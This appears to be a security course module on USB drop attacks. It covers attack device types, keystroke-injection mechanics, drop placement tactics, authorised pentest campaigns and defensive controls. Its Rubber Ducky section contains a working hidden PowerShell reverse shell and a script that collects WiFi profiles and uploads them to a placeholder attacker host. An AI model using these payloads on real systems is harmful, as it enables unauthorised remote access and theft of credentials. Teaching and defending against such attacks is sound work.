# Unit 6: Technical Social Engineering — Topic 5: USB Drops

## Overview

**USB drops** are a social engineering technique where malicious USB devices are strategically placed in locations where targets will find and plug them into their computers. This topic focuses on the technical aspects of USB-based attacks, including device types, payload creation, deployment strategies, and defensive measures. USB drops combine physical placement with technical exploitation.

---

## 1. USB Attack Device Types

```
DEVICE SPECTRUM:

BASIC — MALICIOUS FILES ON USB:
  Cost: $5-10
  → Standard USB drive with malware files
  → Relies on user opening files manually
  → autorun.inf (mostly blocked now)
  → Weaponized documents, executables
  → Lowest sophistication

INTERMEDIATE — USB RUBBER DUCKY:
  Cost: $50-80
  → Emulates USB keyboard (HID device)
  → Types pre-programmed keystrokes
  → Executes in seconds
  → No files to scan — it's a "keyboard"
  → OS trusts keyboards inherently

ADVANCED — BASH BUNNY:
  Cost: $100-120
  → Multi-function attack platform
  → USB storage + HID + Ethernet
  → Multiple attack modes via switch
  → Exfiltration built-in
  → Extended attack capabilities

ELITE — O.MG CABLE:
  Cost: $120-180
  → Looks exactly like charging cable
  → Hidden Wi-Fi chip inside
  → Remote command injection
  → Keystroke injection on demand
  → Geofencing capabilities
  → Virtually undetectable

DESTRUCTIVE — USB KILLER:
  Cost: $50-100
  → Charges capacitors from USB power
  → Discharges 200V+ into host device
  → Physically destroys the computer
  → Used for sabotage, not data theft
  → Hardware destruction in seconds
```

---

## 2. USB Rubber Ducky Deep Dive

```
HOW RUBBER DUCKY WORKS:

1. DEVICE RECOGNITION:
   → Computer sees USB HID (keyboard)
   → No driver installation needed
   → Auto-trusted by OS
   → No antivirus alert

2. KEYSTROKE INJECTION:
   → Types at superhuman speed
   → Opens terminal/command prompt
   → Executes commands
   → Downloads and runs payload
   → All in 3-15 seconds

DUCKYSCRIPT EXAMPLE — REVERSE SHELL:

  REM Windows Reverse Shell
  DELAY 1000
  GUI r
  DELAY 500
  STRING powershell -w hidden
  ENTER
  DELAY 1000
  STRING $c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);
  STRING $s=$c.GetStream();
  STRING [byte[]]$b=0..65535|%{0};
  STRING while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  STRING $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
  STRING $r=(iex $d 2>&1|Out-String);
  STRING $m=$r+'PS '+(pwd).Path+'> ';
  STRING $n=([text.encoding]::ASCII).GetBytes($m);
  STRING $s.Write($n,0,$n.Length);
  STRING $s.Flush()};$c.Close()
  ENTER

DUCKYSCRIPT EXAMPLE — CREDENTIAL EXFIL:

  REM Extract WiFi Passwords
  DELAY 1000
  GUI r
  DELAY 500
  STRING cmd /c "netsh wlan show profiles" > %temp%\wifi.txt
  ENTER
  DELAY 2000
  GUI r
  DELAY 500
  STRING powershell -c "Invoke-WebRequest -Uri 'http://attacker/upload' -Method POST -InFile $env:temp\wifi.txt"
  ENTER

ATTACK TIMING:
  → Total execution: 3-15 seconds
  → User may not even see it happen
  → Windows appear and disappear quickly
  → Screen returns to normal after execution
```

---

## 3. Strategic Drop Locations

```
OPTIMAL DROP LOCATIONS:

INSIDE TARGET ORGANIZATION:
  → Parking lot (near target's car)          ★★★★★
  → Lobby / reception area                   ★★★★
  → Break room / kitchen                     ★★★★
  → Restroom counter                         ★★★
  → Conference room                          ★★★★
  → Near printer/copier                      ★★★
  → Elevator                                 ★★
  → Desk area (looks misplaced)              ★★★

OUTSIDE (Adjacent):
  → Sidewalk near building entrance          ★★★
  → Coffee shop frequented by employees      ★★★
  → Public transit stop nearby               ★★
  → Gym/fitness center used by employees     ★★

TIMING:
  → Before work (morning rush)
  → After lunch (coming back from break)
  → Near end of day (less vigilant)
  → After company events

QUANTITY:
  → Drop 5-10 devices for better odds
  → Different locations within same area
  → Mix of labeled and unlabeled
  → Track which ones get plugged in
```

---

## 4. USB Drop Campaigns (Pentesting)

```
LEGITIMATE PENTEST USB CAMPAIGNS:

PLANNING:
  → Define scope with client
  → Number of devices to drop
  → Locations approved
  → Payload type (beacon, not destructive)
  → Tracking mechanism
  → Duration of campaign

PAYLOAD OPTIONS (Non-Destructive):
  → Callback beacon (phone home)
  → HTML page: "You plugged in an unknown USB"
  → Log: timestamp, username, hostname
  → Screenshot capture
  → Network information collection
  → Educational redirect page

TRACKING METHODS:
  → Unique identifier per USB device
  → Callback with device serial number
  → Different colored USBs for different locations
  → GPS-tracked USB (advanced)
  → Web beacon in documents on USB

METRICS TO COLLECT:
  → How many USBs were picked up
  → How many were plugged in
  → Time from drop to plug-in
  → Which locations had highest rate
  → What OS was used
  → Whether user reported it to security

REPORTING:
  → X of Y devices were plugged in (Z%)
  → Average time to plug in: X minutes
  → No devices were reported to security
  → [Location] had highest plug-in rate
  → Recommendations for policy and training
```

---

## 5. Defending Against USB Attacks

```
TECHNICAL CONTROLS:
  → Disable USB mass storage via Group Policy
  → USB device whitelisting (only approved devices)
  → Endpoint detection for HID anomalies
  → Block unknown USB device classes
  → Application control/whitelisting
  → DLP for USB data transfer
  → Full disk encryption
  → Disable autorun/autoplay

GROUP POLICY SETTINGS (Windows):
  Computer Configuration →
    Administrative Templates →
      System → Removable Storage Access →
        "All Removable Storage classes: Deny all access"
  
  → Or specifically deny:
    "Removable Disks: Deny execute access"
    "Removable Disks: Deny read access"
    "Removable Disks: Deny write access"

PHYSICAL CONTROLS:
  → USB port blockers/locks
  → Epoxy-filled USB ports on sensitive systems
  → Locked computer cases
  → Kiosk mode for public computers

POLICY AND TRAINING:
  → "Never plug in unknown USB devices"
  → USB amnesty box at reception/security
  → Report found USB devices to IT
  → Regular USB drop simulations
  → Disciplinary policy for violations
  → Demonstrate attacks in training sessions
```

---

## Summary Table

| Device | Cost | Speed | Stealth | Capability |
|--------|------|-------|---------|-----------|
| USB with malware | $5 | Slow (user action) | Low | Basic |
| Rubber Ducky | $50-80 | 3-15 seconds | High | Medium |
| Bash Bunny | $100-120 | 5-30 seconds | Very High | High |
| O.MG Cable | $120-180 | On demand | Extreme | Very High |
| USB Killer | $50-100 | Instant | N/A | Destructive |

---

## Revision Questions

1. What types of USB attack devices exist and how do they differ?
2. How does a USB Rubber Ducky bypass antivirus protection?
3. What are the most effective drop locations and why?
4. How should USB drop campaigns be conducted in pentesting?
5. What technical controls prevent USB-based attacks?

---

*Previous: [04-qr-code-attacks.md](04-qr-code-attacks.md) | Next: [06-fake-updates.md](06-fake-updates.md)*

---

*[Back to README](../README.md)*
